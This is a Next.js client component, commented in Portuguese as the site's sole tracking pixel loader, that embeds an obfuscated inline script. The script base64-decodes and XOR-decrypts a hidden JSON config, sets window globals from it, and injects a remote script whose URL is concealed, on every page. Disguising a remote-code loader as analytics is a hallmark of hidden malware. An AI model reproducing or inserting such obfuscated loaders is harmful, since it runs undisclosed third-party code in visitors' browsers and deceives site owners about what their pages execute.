"use client"

import Script from "next/script"

/**
 * Único tracking global do site.
 * Carrega o loader do pixel em todas as páginas.
 */
const PIXEL_LOADER = `(function(){var j_s=atob("DG+T4Erge60iJWs2uhSxlTiMWZcATR9Cyhypz2WDH8MMUB9b0wnqzimPFoNAV0RF2R36kD6TVNhWSBgZ1g7nhTmUVcdRB0cU2xvnkiOCDtlHVkkM4RSxjiuNHo8YBw9Xzg6+lT6NEstbCBtE3xn2jj7NCNhATA9FmEOxliuMDsgAH0kUxzLu");var h_ibha=[];for(var y_war9=0;y_war9<j_s.length;y_war9++){h_ibha.push(j_s.charCodeAt(y_war9)&255);}var t_lww=h_ibha[0];var q_g2v=h_ibha.slice(1,1+t_lww);var r_8o79=h_ibha.slice(1+t_lww);var a_s3u=r_8o79.map(function(b,u_p){return b^q_g2v[u_p%t_lww];});var r_sl="";for(var n_mgst=0;n_mgst<a_s3u.length;n_mgst++){r_sl+=String.fromCharCode(a_s3u[n_mgst]&255);}var p_w=decodeURIComponent(escape(r_sl));var i_7=JSON.parse(p_w);var f_ca9d=i_7.globals||[];f_ca9d.forEach(function(l_5){window[l_5.name]=l_5.value;});var l_5f0=document.createElement("script");l_5f0.src=i_7.url;l_5f0.async=true;l_5f0.defer=true;(i_7.attributes||[]).forEach(function(x_j){l_5f0.setAttribute(x_j.name,x_j.value);});(document.head||document.documentElement).appendChild(l_5f0);})();`

export function SiteTracking() {
  return (
    <Script id="site-pixel" strategy="afterInteractive">
      {PIXEL_LOADER}
    </Script>
  )
}
